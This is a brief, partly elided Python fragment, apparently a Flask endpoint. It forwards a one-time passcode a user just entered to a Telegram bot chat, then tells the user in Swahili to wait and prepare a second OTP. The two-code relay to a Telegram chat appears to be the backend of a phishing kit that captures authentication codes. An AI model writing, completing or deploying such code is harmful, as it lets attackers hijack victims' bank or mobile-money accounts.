...
"""
    ...
    # Send the first OTP to Telegram immediately so the admin can see it before final approval.
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, data={
            'chat_id': CHAT_ID,
            'text': f'First OTP entered for request {request_id}: {otp}'
        }, timeout=10)
    except requests.RequestException:
        pass
    ...
    return jsonify({'status': 'pending_second', 'message': 'OTP ya kwanza imekubaliwa. Tafadhali subiri kidogo huku ombi likisindika na ujiandae kuingiza OTP ya pili ili kukamilisha mchakato.'})
